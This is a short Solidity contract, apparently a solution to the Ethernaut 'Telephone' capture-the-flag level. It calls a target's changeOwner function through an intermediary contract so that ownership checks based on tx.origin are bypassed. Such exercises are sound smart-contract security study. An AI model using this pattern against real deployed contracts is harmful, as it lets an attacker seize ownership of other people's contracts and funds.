//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

interface Telephone {

  function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    address public targetContract;

    constructor(address _targetContract){
        targetContract = _targetContract;
    }

    function changeTargetOwner(address owner) external {
        Telephone(targetContract).changeOwner(owner);
    }

}